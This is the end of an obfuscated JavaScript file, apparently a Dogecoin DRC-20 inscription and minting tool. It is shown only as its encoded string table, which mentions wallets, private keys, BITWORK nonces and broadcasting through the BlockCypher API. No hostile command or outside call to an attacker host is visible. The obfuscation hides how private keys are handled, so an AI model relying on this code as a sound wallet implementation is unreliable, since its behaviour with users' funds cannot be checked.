0\x20##\x20\x20\x0a\x09##\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20##\x20\x20\x20##\x20\x20\x20##\x20\x20\x20\x20##\x20\x20##\x20\x20\x20##\x20\x20\x20##\x20\x20#\x20\x20##\x20\x20\x0a\x09##\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20\x20\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20##\x20\x20##\x20\x20\x20\x20###\x20###\x20\x20\x20\x0a\x09##\x20\x20\x20\x20##\x20\x20#######\x20\x20#######\x20\x20#######\x20\x20\x20\x20####\x20\x20\x20\x20\x20\x20\x20\x20#####\x20\x20\x20\x20\x20\x20\x20####\x20\x20\x20\x20\x20\x20####\x20\x20\x20\x20\x20\x20##\x20##\x20\x20\x20\x20\x0a\x09\x0a',
        'catch',
        'config',
        '\x20DOGE）',
        'Insufficient\x20balance\x20for\x20mining.\x20Required:\x20>3\x20DOGE,\x20Available:',
        'toHex',
        '\x1b[36m-------\x20Transaction\x20for\x20Manual\x20Broadcast\x20-------\x1b[0m',
        'Output',
        'wallet',
        'warn',
        'sha256',
        '10078284zppOfQ',
        'parse',
        'Receive\x20address:\x20',
        '21681ucwLXm',
        'wallet\x20already\x20exists',
        'no\x20funds\x20to\x20split',
        'stdout',
        'no\x20testnet\x20api',
        'address',
        'outputAmount',
        'drc-20',
        '30581620Cfzxaj',
        'https://api.blockcypher.com/v1/doge/main/txs/push',
        '\x1b[31mBroadcast\x20failed.\x1b[0m',
        'no\x20data\x20to\x20mint',
        'toBuffer',
        ',\x20TXID:\x20',
        'hex',
        'Send\x20address:\x20',
        'privkey',
        'push',
        '\x1b[33mRetrying\x20due\x20to\x20too-long-mempool-chain...\x1b[0m',
        'value',
        'OP_DROP',
        'bad-txns-inputs-spent',
        '2434324LvsVaH',
        'get',
        'BITWORK',
        'Nonce:\x20',
        'map',
        '\x20DOGE，Max\x20fee:\x20',
        'KjUVg',
        'txid',
        '10zecGET',
        'floor',
        'replace',
        'Attempting\x20to\x20broadcast\x20(Attempt\x20',
        'Manual\x20broadcast\x20may\x20be\x20required.\x20Use\x20the\x20serialized\x20transaction\x20above.',
        'unknown\x20subcommand:\x20',
        'reduce',
        'test',
        'toAddress',
        '1492Vgnadf',
        'sign',
        'OP_HASH160',
        'chunks',
        'txrefs',
        'UhMvxbd',
        '\x1b[36m------------------------------------------------\x1b[0m',
        'trim',
        'OP_TRUE',
        '?unspentOnly=true&includeScript=true',
        'min',
        'Bitwork:\x20',
        '6249iHWiBu',
        'change',
        'DOGE',
        'bitcore-lib-doge',
        'tx_output_n',
        'defaultNetwork',
        'from',
        'existsSync',
        'inscription\x20txid:',
        'OP_CHECKSIGVERIFY',
        'setScript',
        '\x0abalance',
        'MAX_FEE_SAT',
        'tx\x20already\x20sent,\x20skipping',
        'mime-types',
        'crypto',
        'true',
        'no\x20transactions\x20to\x20broadcast',
        'getSignatures',
        'shift',
        'concat',
        'spent',
        'no\x20funds\x20to\x20send',
        'prevTxId',
        'buildPublicKeyHashOut',
        'script',
        '2096vnsrTi',
        'SIGHASH_ALL',
        'env',
        'message',
        '\x20Timestamp:\x20',
        'outputs',
        'tx_hash',
        '\x1b[32mBroadcast\x20successful!\x1b[0m',
        'getFee',
        'unknown\x20command:\x20'
    ];
    _0x31a7 = function () {
        return _0x330502;
    };
    return _0x31a7();
}